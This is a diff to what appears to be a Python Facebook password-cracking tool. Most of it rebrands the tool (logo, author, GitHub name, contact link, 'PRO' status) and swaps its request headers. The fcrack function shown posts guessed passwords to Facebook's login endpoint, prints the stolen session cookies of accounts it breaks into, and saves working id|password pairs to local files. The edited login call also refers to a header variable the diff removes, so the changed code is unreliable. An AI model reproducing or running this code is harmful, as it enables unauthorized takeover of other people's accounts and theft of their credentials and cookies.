@@ -1084,20 +1084,20 @@ for xd in range(10000):
     ugen.append(uaku2)
 
 logo = """
-\033[1;30m*      **     **       *******        **     ****     ** **
-\033[1;31m/**     /**    ****     **/////**      ****   /**/**   /**/**
-\033[1;32m/**     /**   **//**   **     //**    **//**  /**//**  /**/**
-\033[1;33m/**********  **  //** /**      /**   **  //** /** //** /**/**
-\033[1;34m/**//////** **********/**    **/**  **********/**  //**/**/**
-\033[1;35m/**     /**/**//////**//**  // **  /**//////**/**   //****/**
-\033[1;36m/**     /**/**     /** //******* **/**     /**/**    //***/**
-\033[1;37m//      // //      //   /////// // //      // //      /// // \033[1;32m HAQANI?ðð­â\033[1;37m 
+\033[1;30m ████              ██ 
+\033[1;31m██   ██            ██
+\033[1;32m██   ██            ██
+\033[1;33m██   ██   ██   ██
+\033[1;34m█████   █████
+\033[1;35m //\\//\\//\\//\\//\\
+\033[1;36m//\\//\\//\\//\\//\\
+\033[1;37m//\\//\\//\\//\\//\\033[1;32m HAQANI?ðð­â\033[1;37m 
 --------------------------------------------------
-[â¢] AUTHOR     : \033[1;32mHAQANIJOKER\033[1;37m
-[â¢] GITHUB     : \033[1;32mHAQANI-JOKERð\033[1;37m
-[â¢] TOOL NAME  : \033[1;32mHAQANIJOKER\033[1;37m
+[â¢] AUTHOR     : \033[1;32mRABBI-DJ\033[1;37m
+[â¢] GITHUB     : \033[1;32mZACK-ON-FIREð\033[1;37m
+[â¢] TOOL NAME  : \033[1;32mDJ-KING\033[1;37m
 [â¢] TOOL TYPE  : \033[1;32mRANDOM\033[1;37m
-[â¢] STATUS     : \033[1;32mFREE\033[1;37m
+[â¢] STATUS     : \033[1;32mPRO\033[1;37m
 --------------------------------------------------
 [â¢] \033[1;37mVERSION    :\033[1;32m 0.2 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
 --------------------------------------------------"""
@@ -1143,7 +1143,7 @@ def rehan():
 	elif gh =='3':
 		chos()
 	elif gh =='4':
-		os.system('xdg-open https://www.facebook.com/profile.php?id=100076836729404')
+		os.system('xdg-open https://www.facebook.com/profile.php?id=100008424469377')
 	elif gh =='0':
 		print('[â¢] THANKS FOR USE ')
 		time.sleep(3)
@@ -1467,34 +1467,36 @@ def fcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'p.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'en-GB,en-NZ;q=0.9,en-AS;q=0.8,en-US;q=0.7,en;q=0.6',
-    'cache-control': 'max-age=0',
-    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': pro}
+            headers = {
+            'authority': 'mbasic.facebook.com',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'sec-fetch-site': 'cross-site',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-user': '?1',
+            'sec-fetch-dest': 'document',
+            'referer': 'https://www.google.com/',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',}
             lo = session.post('https://p.facebook.com//login/device-based/login/async/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[JOKER-OK] '+cid+'|'+ps+'\033[0;97m\n[ââð]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
-                open('RDX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                print('\033[1;32m[DJ-OK] '+cid+'|'+ps+'\033[0;97m\n[ââð]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                open('DJ-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
                 # print('\033[1;33m[HAQANI??-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('RDX-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                open('DJ-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
